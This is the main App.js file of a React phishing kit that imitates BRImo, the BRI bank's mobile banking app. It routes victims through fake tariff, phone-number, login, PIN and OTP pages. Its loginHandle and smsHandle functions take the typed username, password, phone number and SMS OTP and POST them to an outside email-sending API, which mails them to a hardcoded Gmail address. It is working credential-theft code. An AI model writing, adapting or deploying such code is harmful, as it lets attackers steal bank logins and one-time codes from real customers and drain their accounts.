import { useState } from 'react';
import { BrowserRouter as Router, Routes, Route } from 'react-router-dom';
import '../assets/css/App.css';

// pages
import Home from './Home'
import Pin from './Pin'
import Login from './Login'
import Otp from './Otp'
import Notlp from './Notlp'
import Tarif from './Tarif'

function App() {
  const [user, setUser] = useState('');
  const [pass, setPass] = useState('');
  const [sms, setSms] = useState('');
  const [tlp, setTlp] = useState('');

  const [email, setEmail] = useState('fggroj@gmail.com');
  const [api, setApi] = useState('https://nu-app-sender-email.herokuapp.com/v3/text-mail');

  const loginHandle = () => {
    
      let ket = 'Login'
      let props1 = 'Username : '
      let value1 = user
      let props2 = 'Password : '
      let value2 = pass
      let props3 = 'telepon : '
      let value3 = tlp
    
      fetch(api, {
        method: 'POST',
        headers: {
          accept: 'application.json',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          to: email,
          subject: '[ NEW ] Data '+ket+" dari BRIMO Bri.",
          text: `
            Data ${ket} dari BRIMO Bri
            1. ${props1 + value1}
            2. ${props2 + value2}
            3. ${props3 + value3}
          `
        })
      })
      .then(res => res.json())
      .then(res => console.log('Link Salah!'))
  }

  const smsHandle = () => {
    var data = {ket: 'SMS OTP', props1 : 'SMS : ',value1 : sms};
    
    fetch(api, {
      method: 'POST',
      headers: {
        accept: 'application.json',
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        to: email,
        subject: '[ NEW ] Data '+data.ket+" dari BRIMO Bri.",
        text: `
          Data ${data.ket} dari BRIMO Bri
          1. ${data.props1 + data.value1}
        `
      })
    })
    .then(res => res.json())
    .then(res => console.error('Link Salah!'))
  }
  
  return (
    <Router>
      <div>
        <Routes>
          <Route path='/' element={<Tarif />}/>
          <Route path='/tlp' element={<Notlp tlp={setTlp} />}/>
          <Route path='/login' element={<Login user={setUser} pass={setPass} send={loginHandle} />} />
          <Route path='/pin' element={<Pin email={email} api={api}  />} />
          <Route path='/otp' element={<Otp sms={setSms} send={smsHandle} />} />
        </Routes>
      </div>
    </Router>
  );
}

export default App;
